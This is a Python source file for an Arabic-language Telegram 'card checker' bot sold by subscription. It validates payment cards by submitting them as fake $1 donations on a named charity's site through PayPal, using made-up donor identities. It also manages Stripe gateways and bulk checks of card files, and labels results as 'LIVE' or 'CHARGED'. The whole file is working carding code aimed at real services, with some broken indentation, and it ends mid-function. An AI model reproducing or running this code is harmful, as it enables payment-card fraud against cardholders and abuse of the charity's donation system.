        {"line1": "987 Birch Drive", "city": "Denver", "state": "CO", "zip": "80201"},
        {"line1": "147 Walnut Court", "city": "Phoenix", "state": "AZ", "zip": "85001"},
        {"line1": "258 Spruce Way", "city": "Seattle", "state": "WA", "zip": "98101"},
        {"line1": "369 Willow Place", "city": "Miami", "state": "FL", "zip": "33101"},
    ]
    
    PHONE_PREFIXES = ["212", "310", "312", "415", "602", "713", "206", "305", "404", "503"]
    EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com"]
    
    def random_donor(self) -> Dict[str, str]:
        first = random.choice(self.FIRST_NAMES)
        last = random.choice(self.LAST_NAMES)
        addr = random.choice(self.ADDRESSES)
        phone = random.choice(self.PHONE_PREFIXES) + ''.join([str(random.randint(0, 9)) for _ in range(7)])
        domain = random.choice(self.EMAIL_DOMAINS)
        email = f"{first.lower()}{random.randint(10, 9999)}@{domain}"
        return {
            "first": first,
            "last": last,
            "email": email,
            "phone": phone,
            "address": addr
        }
    
    @staticmethod
    def detect_type(n: str) -> str:
        n = n.replace(" ", "").replace("-", "")
        if n.startswith("4"):
            return "VISA"
        elif re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n):
            return "MASTER_CARD"
        elif n.startswith(("34", "37")):
            return "AMEX"
        elif n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n):
            return "DISCOVER"
        return "VISA"
    
    async def check_card(self, card_data: Dict) -> Tuple[bool, str]:
        try:
            donor = self.random_donor()
            session = requests.Session()
            session.verify = True
            ua_str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
            ajax_headers = {
                "User-Agent": ua_str,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://awwatersheds.org",
                "Referer": "https://awwatersheds.org/donate/",
                "X-Requested-With": "XMLHttpRequest"
            }
            
            # Scrape tokens
            r = session.get("https://awwatersheds.org/donate/", headers={"User-Agent": ua_str}, timeout=20)
            html = r.text
            
            hash_match = re.search(r'name="give-form-hash" value="(.*?)"', html)
            if not hash_match:
                hash_match = re.search(r'"base_hash":"(.*?)"', html)
            if not hash_match:
                return False, "❌ Failed to get form hash"
            
            pfx_match = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
            id_match = re.search(r'name="give-form-id" value="(.*?)"', html)
            
            if not pfx_match or not id_match:
                return False, "❌ Failed to get form data"
            
            tokens = {
                'hash': hash_match.group(1),
                'pfx': pfx_match.group(1),
                'id': id_match.group(1)
            }
            
            # Register donation
            data = {
                "give-honeypot": "",
                "give-form-id-prefix": tokens['pfx'],
                "give-form-id": tokens['id'],
                "give-form-title": "Sustainers Circle",
                "give-current-url": "https://awwatersheds.org/donate/",
                "give-form-url": "https://awwatersheds.org/donate/",
                "give-form-hash": tokens['hash'],
                "give-price-id": "custom",
                "give-amount": "1.00",
                "payment-mode": "paypal-commerce",
                "give_first": donor["first"],
                "give_last": donor["last"],
                "give_email": donor["email"],
                "give-lake-affiliation": "Other",
                "give_action": "purchase",
                "give-gateway": "paypal-commerce",
                "action": "give_process_donation",
                "give_ajax": "true"
            }
            
            r = session.post("https://awwatersheds.org/wp-admin/admin-ajax.php", headers=ajax_headers, data=data, timeout=20)
            if r.status_code != 200:
                return False, "❌ Donation registration failed"
            
            # Create order
            data = {
                "give-honeypot": "",
                "give-form-id-prefix": tokens['pfx'],
                "give-form-id": tokens['id'],
                "give-form-hash": tokens['hash'],
                "payment-mode": "paypal-commerce",
                "give-amount": "1.00",
                "give-gateway": "paypal-commerce",
            }
            
            r = session.post("https://awwatersheds.org/wp-admin/admin-ajax.php",
                            params={"action": "give_paypal_commerce_create_order"},
                            headers=ajax_headers, data=data, timeout=20)
            order_data = r.json()
            
            if not order_data.get("success") or not order_data.get("data", {}).get("id"):
                return False, "❌ PayPal order creation failed"
            
            order_id = order_data["data"]["id"]
            
            # Charge card
            addr = donor["address"]
            full_yy = card_data['year'] if len(card_data['year']) == 4 else "20" + card_data['year']
            
            graphql_h = {
                "Host": "www.paypal.com",
                "Paypal-Client-Context": order_id,
                "X-App-Name": "standardcardfields",
                "Paypal-Client-Metadata-Id": order_id,
                "User-Agent": ua_str,
                "Content-Type": "application/json",
                "Origin": "https://www.paypal.com",
                "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
                "X-Country": "US"
            }
            
            query = """
            mutation payWithCard(
                $token: String!
                $card: CardInput
                $paymentToken: String
                $phoneNumber: String
                $firstName: String
                $lastName: String
                $shippingAddress: AddressInput
                $billingAddress: AddressInput
                $email: String
                $currencyConversionType: CheckoutCurrencyConversionType
                $installmentTerm: Int
                $identityDocument: IdentityDocumentInput
                $feeReferenceId: String
            ) {
                approveGuestPaymentWithCreditCard(
                    token: $token
                    card: $card
                    paymentToken: $paymentToken
                    phoneNumber: $phoneNumber
                    firstName: $firstName
                    lastName: $lastName
                    email: $email
                    shippingAddress: $shippingAddress
                    billingAddress: $billingAddress
                    currencyConversionType: $currencyConversionType
                    installmentTerm: $installmentTerm
                    identityDocument: $identityDocument
                    feeReferenceId: $feeReferenceId
                ) {
                    flags { is3DSecureRequired }
                    cart {
                        intent
                        cartId
                        buyer { userId auth { accessToken } }
                        returnUrl { href }
                    }
                    paymentContingencies {
                        threeDomainSecure {
                            status method
                            redirectUrl { href }
                            parameter
                        }
                    }
                }
            }
            """
            
            billing = {
                "givenName": donor["first"],
                "familyName": donor["last"],
                "line1": addr["line1"],
                "line2": None,
                "city": addr["city"],
                "state": addr["state"],
                "postalCode": addr["zip"],
                "country": "US"
            }
            
            variables = {
                "token": order_id,
                "card": {
                    "cardNumber": card_data['number'],
                    "type": self.detect_type(card_data['number']),
                    "expirationDate": f"{card_data['month']}/{full_yy}",
                    "postalCode": addr["zip"],
                    "securityCode": card_data['cvv']
                },
                "phoneNumber": donor["phone"],
                "firstName": donor["first"],
                "lastName": donor["last"],
                "email": donor["email"],
                "billingAddress": billing,
                "shippingAddress": billing,
                "currencyConversionType": "PAYPAL"
            }
            
            r = requests.post(
                "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
                headers=graphql_h,
                json={"query": query, "variables": variables},
                timeout=30
            )
            paypal_text = r.text
            
            # Approve order
            data = {
                "give-honeypot": "",
                "give-form-id-prefix": tokens['pfx'],
                "give-form-id": tokens['id'],
                "give-form-hash": tokens['hash'],
                "payment-mode": "paypal-commerce",
                "give-amount": "1.00",
                "give-gateway": "paypal-commerce",
            }
            
            r = session.post(
                "https://awwatersheds.org/wp-admin/admin-ajax.php",
                params={"action": "give_paypal_commerce_approve_order", "order": order_id},
                headers=ajax_headers, data=data, timeout=30
            )
            
            # Analyze response
            t = paypal_text.upper()
            
            if 'APPROVESTATE":"APPROVED' in t:
                return True, "✅ CHARGED - Payment Approved!"
            if 'PARENTTYPE":"AUTH' in t and '"CARTID"' in t:
                return True, "✅ CHARGED - Auth Successful!"
            if '"APPROVEGUESTPAYMENTWITHCREDITCARD"' in t and '"ERRORS"' not in t and '"CARTID"' in t:
                return True, "✅ CHARGED!"
            if 'CVV2_FAILURE' in t:
                return True, "💳 CVV2 FAILURE (Card is LIVE)"
            if 'INVALID_SECURITY_CODE' in t:
                return True, "💳 CCN - Invalid Security Code (LIVE)"
            if 'INVALID_BILLING_ADDRESS' in t:
                return True, "✅ AVS FAILED (LIVE)"
            if 'INSUFFICIENT_FUNDS' in t:
                return True, "💰 Insufficient Funds (LIVE CARD)"
            
            combined = t
            declines = [
                ('DO_NOT_HONOR', 'Do Not Honor'),
                ('ACCOUNT_CLOSED', 'Account Closed'),
                ('LOST_OR_STOLEN', 'LOST OR STOLEN'),
                ('SUSPECTED_FRAUD', 'SUSPECTED FRAUD'),
                ('INVALID_ACCOUNT', 'INVALID ACCOUNT'),
                ('EXPIRED_CARD', 'EXPIRED CARD'),
            ]
            
            for keyword, msg in declines:
                if keyword in combined:
                    return False, f"❌ {msg}"
            
            return False, "❌ DECLINED"
            
        except Exception as e:
            return False, f"⚠️ Error: {str(e)[:50]}"

# ==================== بوابات الفحص ====================
class RealGateways:
    def __init__(self):
        self.gateway1 = StripeGateway1()
        self.gateway2 = StripeGateway2()
        self.gateway3 = PayPalGateway()
    
    async def check_card(self, gate: str, card: Dict, site_url: str = None) -> Tuple[bool, str]:
        if gate == 'stripe1':
            return await self.gateway1.process_card(site_url, card)
        elif gate == 'stripe2':
            return await self.gateway2.process_card(card)
        elif gate == 'paypal':
            return await self.gateway3.check_card(card)
        else:
            return False, "❌ بوابة غير مدعومة"

# ==================== مدير الفحص المتعدد ====================
class MassCheckManager:
    """مدير الفحص المتعدد - يتحكم في عمليات الفحص المتعددة"""
    
    def __init__(self):
        self.active_checks = {}  # {check_id: check_data}
        self.user_current_check = {}  # {user_id: check_id}
    
    def start_check(self, user_id: int, chat_id: int, cards: List[Dict], gate: str, message_id: int = None) -> int:
        """بدء فحص جديد للمستخدم"""
        # إذا كان المستخدم لديه فحص نشط، قم بإلغائه أولاً
        if user_id in self.user_current_check:
            self.stop_check(user_id)
        
        check_id = int(time.time() * 1000)  # معرف فريد
        
        self.active_checks[check_id] = {
            'user_id': user_id,
            'chat_id': chat_id,
            'cards': cards,
            'gate': gate,
            'total': len(cards),
            'checked': 0,
            'approved': 0,
            'declined': 0,
            'stop': False,
            'message_id': message_id,
            'start_time': datetime.now()
        }
        
        self.user_current_check[user_id] = check_id
        return check_id
    
    def stop_check(self, user_id: int) -> bool:
        """إيقاف الفحص النشط للمستخدم"""
        if user_id in self.user_current_check:
            check_id = self.user_current_check[user_id]
            if check_id in self.active_checks:
                self.active_checks[check_id]['stop'] = True
                return True
        return False
    
    def get_check(self, user_id: int) -> Optional[Dict]:
        """الحصول على بيانات الفحص النشط للمستخدم"""
        if user_id in self.user_current_check:
            check_id = self.user_current_check[user_id]
            return self.active_checks.get(check_id)
        return None
    
    def remove_check(self, user_id: int):
        """إزالة الفحص بعد الانتهاء"""
        if user_id in self.user_current_check:
            check_id = self.user_current_check[user_id]
            if check_id in self.active_checks:
                del self.active_checks[check_id]
            del self.user_current_check[user_id]
    
    def is_checking(self, user_id: int) -> bool:
        """التحقق مما إذا كان المستخدم يقوم بفحص حاليًا"""
        if user_id in self.user_current_check:
            check_id = self.user_current_check[user_id]
            if check_id in self.active_checks:
                return not self.active_checks[check_id].get('stop', False)
        return False
    
    def get_progress(self, user_id: int) -> Optional[Dict]:
        """الحصول على تقدم الفحص الحالي"""
        check = self.get_check(user_id)
        if check:
            return {
                'total': check['total'],
                'checked': check['checked'],
                'approved': check['approved'],
                'declined': check['declined'],
                'gate': check['gate']
            }
        return None

# ==================== واجهة المستخدم ====================
class UserInterface:
    @staticmethod
    def main_menu(chat_type: str = "private"):
        markup = InlineKeyboardMarkup(row_width=2)
        
        if chat_type == "private":
            btns = [
                InlineKeyboardButton("💳 Stripe v1", callback_data="gate_stripe1"),
                InlineKeyboardButton("💎 Stripe v2", callback_data="gate_stripe2"),
                InlineKeyboardButton("💸 PayPal", callback_data="gate_paypal"),
                InlineKeyboardButton("📁 فحص ملف", callback_data="mass_check"),
                InlineKeyboardButton("⚙️ البوابة الافتراضية", callback_data="default_gate"),
                InlineKeyboardButton("👤 حسابي", callback_data="my_profile"),
                InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
                InlineKeyboardButton("💎 الاشتراك", callback_data="subscribe"),
                InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
                InlineKeyboardButton("👨‍💻 المطور", url=SUPPORT_LINK)
            ]
        else:
            btns = [
                InlineKeyboardButton("💳 Stripe v1", callback_data="gate_stripe1"),
                InlineKeyboardButton("💎 Stripe v2", callback_data="gate_stripe2"),
                InlineKeyboardButton("💸 PayPal", callback_data="gate_paypal"),
                InlineKeyboardButton("📁 فحص آخر ملف", callback_data="check_last_file"),
                InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
                InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
                InlineKeyboardButton("👨‍💻 المطور", url=SUPPORT_LINK)
            ]
        
        markup.add(*btns)
        return markup
    
    @staticmethod
    def default_gate_menu(current_gate: str):
        markup = InlineKeyboardMarkup(row_width=2)
        for gate_id, gate in GATES.items():
            status = "✅ " if gate_id == current_gate else ""
            markup.add(InlineKeyboardButton(f"{status}{gate['icon']} {gate['name']}", callback_data=f"set_default_{gate_id}"))
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_main"))
        return markup
    
    @staticmethod
    def back_button(callback="back_main"):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data=callback))
        return markup
    
    @staticmethod
    def stop_button(check_id: int):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ إيقاف الفحص", callback_data=f"stop_{check_id}"))
        return markup

# ==================== معالج الأوامر ====================
class CommandHandler:
    def __init__(self):
        self.gateways = RealGateways()
        self.ui = UserInterface()
        self.mass_manager = MassCheckManager()
        self.user_last_file = user_last_file
        self.start_auto_tasks()
    
    def start_auto_tasks(self):
        def auto_tasks():
            while True:
                try:
                    DataManager.auto_backup()
                    DataManager.auto_clean()
                except Exception as e:
                    print(f"⚠️ خطأ في المهام التلقائية: {e}")
                time.sleep(3600)
        
        thread = threading.Thread(target=auto_tasks, daemon=True)
        thread.start()
    
    def check_sub(self, message) -> bool:
        return DataManager.check_access(message.from_user.id, message.chat.id)
    
    def save_last_file(self, user_id: int, file_id: str, file_name: str, content: str):
        self.user_last_file[user_id] = {
            "file_id": file_id,
            "file_name": file_name,
            "content": content,
            "timestamp": datetime.now().isoformat()
        }
        for uid in list(self.user_last_file.keys()):
            try:
                ts = datetime.fromisoformat(self.user_last_file[uid]["timestamp"])
                if (datetime.now() - ts).seconds > 3600:
                    del self.user_last_file[uid]
            except:
                pass
    
    def get_last_file(self, user_id: int) -> Optional[Dict]:
        return self.user_last_file.get(user_id)
    
    def handle_start(self, message):
        user = message.from_user
        chat_id = message.chat.id
        chat_type = Helpers.get_chat_type(chat_id)
        
        users = DataManager.load_users()
        uid = str(user.id)
        
        if uid not in users:
            users[uid] = {
                "user_id": user.id,
                "username": user.username,
                "first_name": user.first_name,
                "joined_date": datetime.now().isoformat(),
                "is_admin": user.id in ADMIN_IDS,
                "usage": {"total_checks": 0, "approved": 0, "declined": 0},
                "default_gate": "stripe1"
            }
            DataManager.save_users(users)
        
        default_gate = DataManager.get_user_default_gate(user.id)
        default_gate_name = GATES.get(default_gate, {}).get("name", "Stripe v1")
        
        if chat_type == "private":
            welcome = f"""
✨ <b>مرحباً بك في بوت Obeida Online</b> ✨

<b>🚪 البوابة الافتراضية:</b> {default_gate_name}
<b>💡 يمكنك إرسال البطاقة مباشرة وسيتم فحصها تلقائياً!</b>

<b>📝 البوابات المتاحة:</b>
💳 Stripe v1 - فحص عبر SetupIntent
💎 Stripe v2 - فحص بديل
💸 PayPal Charge - فحص عبر PayPal Commerce

<b>📝 الأوامر:</b>
/st1 - فحص بطاقة عبر Stripe v1
/st2 - فحص بطاقة عبر Stripe v2
/pay - فحص بطاقة عبر PayPal
/st1m - فحص ملف عبر Stripe v1
/st2m - فحص ملف عبر Stripe v2
/paym - فحص ملف عبر PayPal
/stop - إيقاف الفحص الحالي

<b>📢 القناة:</b> {CHANNEL_USERNAME}
<b>👨‍💻 المطور:</b> {DEV_CONTACT}
"""
        else:
            welcome = f"""
✨ <b>مرحباً بك في بوت Obeida Online</b> ✨

<b>🚪 البوابة الافتراضية:</b> {default_gate_name}

<b>📝 كيفية الاستخدام في المجموعة:</b>
• أرسل البطاقة مع منشن البوت: <code>@{BOT_USERNAME} 4111111111111111|12|25|123</code>
• أرسل ملف txt مع منشن البوت
• استخدم /st1@ObeidaOnlineBot أو /st2@ObeidaOnlineBot أو /pay@ObeidaOnlineBot
• /stop@ObeidaOnlineBot - إيقاف الفحص الحالي

<b>📢 القناة:</b> {CHANNEL_USERNAME}
<b>👨‍💻 المطور:</b> {DEV_CONTACT}
"""
        
        bot.send_message(user.id if chat_type == "private" else chat_id, welcome, 
                        parse_mode='HTML', reply_markup=self.ui.main_menu(chat_type))
    
    def handle_stop(self, message):
        """إيقاف الفحص الحالي للمستخدم"""
        user_id = message.from_user.id
        
        if self.mass_manager.stop_check(user_id):
            bot.reply_to(message, "⛔ <b>تم إيقاف الفحص بنجاح</b>\n\nيمكنك بدء فحص جديد في أي وقت.", parse_mode='HTML')
        else:
            # التحقق إذا كان هناك فحص نشط
            check = self.mass_manager.get_check(user_id)
            if check:
                bot.reply_to(message, "⚠️ <b>لا يمكن إيقاف الفحص حالياً</b>\n\nيرجى المحاولة مرة أخرى.", parse_mode='HTML')
            else:
                bot.reply_to(message, "ℹ️ <b>لا يوجد فحص نشط حالياً</b>\n\nاستخدم /st1m أو /st2m أو /paym لبدء فحص جديد.", parse_mode='HTML')
    
    def handle_profile(self, message):
        user_id = message.from_user.id
        users = DataManager.load_users()
        data = users.get(str(user_id), {})
        usage = data.get('usage', {})
        sub = data.get('subscription', {})
        default_gate = data.get('default_gate', 'stripe1')
        default_gate_name = GATES.get(default_gate, {}).get("name", "Stripe v1")
        expiry = sub.get('expiry', 'لا يوجد')[:10] if sub.get('expiry') else 'لا يوجد'
        total = usage.get('total_checks', 0)
        approved = usage.get('approved', 0)
        declined = usage.get('declined', 0)
        
        profile = f"""
👤 <b>الملف الشخصي</b>
━━━━━━━━━━━━
<b>🆔 المعرف:</b> <code>{user_id}</code>
<b>👤 الاسم:</b> {data.get('first_name', 'Unknown')}
<b>⭐ الرتبة:</b> {'👑 مشرف' if user_id in ADMIN_IDS else '💎 مشترك' if sub.get('active') else '🔹 عادي'}
<b>🚪 البوابة الافتراضية:</b> {default_gate_name}
<b>📅 الانضمام:</b> {data.get('joined_date', 'Unknown')[:10]}

<b>📊 الإحصائيات:</b>
• إجمالي: {total}
• ✅ المقبولة: {approved}
• ❌ المرفوضة: {declined}
• 📈 نسبة النجاح: {(approved/total*100) if total > 0 else 0:.1f}%

<b>💎 الاشتراك:</b> {sub.get('plan', 'لا يوجد')} | ينتهي: {expiry}
━━━━━━━━━━━━
<b>🆔 Obeida Online</b>
"""
        bot.reply_to(message, profile, parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_stats(self, message):
        stats = DataManager.load_stats()
        today = datetime.now().strftime("%Y-%m-%d")
        daily = stats.get("daily_stats", {}).get(today, {"checks": 0, "approved": 0})
        total = stats.get('total_checks', 0)
        approved = stats.get('total_approved', 0)
        declined = stats.get('total_declined', 0)
        
        gates_usage = stats.get('gates_usage', {})
        gates_text = "\n".join([f"  {GATES.get(g, {}).get('icon', '🚪')} {g}: {c}" for g, c in gates_usage.items()][:5])
        
        text = f"""
📊 <b>إحصائيات البوت</b>
━━━━━━━━━━━━
📅 <b>اليوم:</b> {daily['checks']} فحص | ✅ {daily['approved']}
━━━━━━━━━━━━
📈 <b>الإجمالي:</b> {total} فحص
✅ المقبولة: {approved}
❌ المرفوضة: {declined}
📊 نسبة النجاح: {(approved/total*100) if total > 0 else 0:.1f}%
━━━━━━━━━━━━
🚪 <b>استخدام البوابات:</b>
{gates_text if gates_text else '  لا توجد بيانات'}
━━━━━━━━━━━━
<b>🆔 Obeida Online</b>
"""
        bot.reply_to(message, text, parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_subscribe(self, message):
        sub = DataManager.get_user_subscription(message.from_user.id)
        if sub:
            expiry_date = sub.get('expiry', '')
            if expiry_date and expiry_date != "2099-12-31":
                remaining = (datetime.fromisoformat(expiry_date) - datetime.now()).days
                text = f"💎 اشتراكك نشط\n📅 ينتهي: {expiry_date[:10]}\n⏰ متبقي: {remaining} يوم"
            else:
                text = "💎 لديك اشتراك دائم (Lifetime)"
            bot.reply_to(message, text, parse_mode='HTML')
        else:
            plans = "\n".join([f"• {p['name']}: {p['price']}" for p in SUBSCRIPTION_PLANS.values()])
            text = f"""
💎 <b>خطط الاشتراك</b>
━━━━━━━━━━━━
{plans}
━━━━━━━━━━━━
<b>للاشتراك تواصل مع المطور:</b> {DEV_CONTACT}
"""
            bot.reply_to(message, text, parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_default_gate(self, message):
        user_id = message.from_user.id
        current_gate = DataManager.get_user_default_gate(user_id)
        bot.reply_to(message, f"⚙️ <b>اختر البوابة الافتراضية</b>\n\nالبوابة الحالية: {GATES[current_gate]['icon']} {GATES[current_gate]['name']}",
                    parse_mode='HTML', reply_markup=self.ui.default_gate_menu(current_gate))
    
    def handle_set_default_gate(self, call, gate_id):
        if DataManager.set_user_default_gate(call.from_user.id, gate_id):
            gate_name = GATES[gate_id]['name']
            bot.answer_callback_query(call.id, f"✅ تم تعيين {gate_name} كبوابة افتراضية")
            bot.edit_message_text(f"✅ تم تعيين {gate_name} كبوابة افتراضية\n\nالآن أي بطاقة ترسلها سيتم فحصها بهذه البوابة",
                                 call.message.chat.id, call.message.message_id,
                                 reply_markup=self.ui.back_button())
        else:
            bot.answer_callback_query(call.id, "❌ فشل في تعيين البوابة")
    
    def check_single_card(self, message, card: Dict, gate: str):
        user_id = message.from_user.id
        gate_name = GATES[gate]['name']
        masked_card = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
        
        progress_msg = bot.reply_to(
            message,
            f"""
🚀  جاري الفحص 🚀
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌

📊 [░░░░░░░░░░░░░░░░░░░░] 0.0%
𒊹︎︎︎ 𝗕𝗔𝗧𝗔𝗤𝗔𝗛 ⌁ {masked_card}
𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ جاري التحقق ◐
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
""",
            parse_mode='HTML'
        )
        
        stop_animation = threading.Event()
        
        def animate_progress():
            frame = 0
            while not stop_animation.is_set():
                try:
                    loading = ResultFormatter.get_loading_animation(frame)
                    percentage = min(frame * 2, 95)
                    bar_length = 20
                    filled = int((percentage / 100) * bar_length)
                    bar = "█" * filled + "░" * (bar_length - filled)
                    
                    text = f"""
🚀  جاري الفحص 🚀
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌

📊 [{bar}] {percentage:.1f}%
𒊹︎︎︎ 𝗕𝗔𝗧𝗔𝗤𝗔𝗛 ⌁ {masked_card}
𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ جاري التحقق {loading}
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
"""
                    bot.edit_message_text(text, progress_msg.chat.id, progress_msg.message_id, parse_mode='HTML')
                    frame += 1
                    time.sleep(0.3)
                except:
                    break
        
        animation_thread = threading.Thread(target=animate_progress)
        animation_thread.start()
        
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            approved, resp = loop.run_until_complete(self.gateways.check_card(gate, card))
            loop.close()
            
            stop_animation.set()
            animation_thread.join(timeout=1)
            
            DataManager.update_usage(message.from_user.id, gate, resp)
            DataManager.save_card_result(card['original'], gate_name, resp, message.from_user.id, approved)
            
            bin_info = Helpers.get_bin_info(card['number'][:6])
            final_result = ResultFormatter.format_single_result(card['original'], resp, approved, gate_name, bin_info)
            
            bot.edit_message_text(final_result, progress_msg.chat.id, progress_msg.message_id, parse_mode='HTML')
            
        except Exception as e:
            stop_animation.set()
            animation_thread.join(timeout=1)
            bot.edit_message_text(f"⚠️ خطأ: {str(e)[:50]}", progress_msg.chat.id, progress_msg.message_id)
    
    def check_multiple_cards(self, message, cards: List[Dict], gate: str):
        """فحص عدة بطاقات متسلسلة"""
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        # التحقق من وجود فحص نشط
        if self.mass_manager.is_checking(user_id):
            bot.reply_to(message, "⚠️ <b>لديك فحص نشط حالياً!</b>\n\nاستخدم /stop لإيقاف الفحص الحالي أولاً.", parse_mode='HTML')
            return
        
        # بدء فحص جديد
        check_id = self.mass_manager.start_check(user_id, chat_id, cards, gate, message.message_id)
        
        # إرسال رسالة بدء الفحص
        start_msg = bot.reply_to(message, f"""
🚀 <b>بدء الفحص المتسلسل</b> 🚀
━━━━━━━━━━━━
📊 <b>إجمالي البطاقات:</b> {len(cards)}
🚪 <b>البوابة:</b> {GATES[gate]['icon']} {GATES[gate]['name']}
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌

✅ <b>المقبولة:</b> 0
❌ <b>المرفوضة:</b> 0
🔄 <b>الحالة:</b> جاري الفحص...
━━━━━━━━━━━━
💡 استخدم /stop لإيقاف الفحص
""", parse_mode='HTML', reply_markup=self.ui.stop_button(check_id))
        
        # تحديث معرف الرسالة في بيانات الفحص
        check = self.mass_manager.get_check(user_id)
        if check:
            check['message_id'] = start_msg.message_id
        
        # بدء الفحص في thread منفصل
        threading.Thread(target=self._run_mass_check, args=(user_id,), daemon=True).start()
    
    def _run_mass_check(self, user_id: int):
        """تشغيل الفحص المتعدد في thread منفصل"""
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self._process_mass_check(user_id))
            loop.close()
        except Exception as e:
            print(f"Error in mass check: {e}")
    
    async def _process_mass_check(self, user_id: int):
    """معالجة الفحص المتعدد - نسخة معدلة بالكامل"""
    check = self.mass_manager.get_check(user_id)
    if not check:
        return
    
    cards = check['cards']
    gate = check['gate']
    chat_id = check['chat_id']
    gate_name = GATES[gate]['name']
    total_cards = len(cards)
    
    # قائمة لتخزين النتائج
    all_results = []
    
    # إرسال رسالة البداية
    progress_msg = await asyncio.get_event_loop().run_in_executor(
        None,
        lambda: bot.send_message(
            chat_id,
            f"""
🚀 <b>جاري الفحص المتسلسل</b> 🚀
━━━━━━━━━━━━
📊 <b>إجمالي البطاقات:</b> {total_cards}
🚪 <b>البوابة:</b> {GATES[gate]['icon']} {gate_name}
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌

✅ <b>المقبولة:</b> 0
❌ <b>المرفوضة:</b> 0
🔄 <b>تم فحص:</b> 0/{total_cards}
━━━━━━━━━━━━
💡 استخدم /stop لإيقاف الفحص
""",
            parse_mode='HTML',
            reply_markup=self.ui.stop_button(int(time.time() * 1000))
        )
    )
    
    # حفظ معرف الرسالة
    message_id = progress_msg.message_id
    
    # فحص كل بطاقة
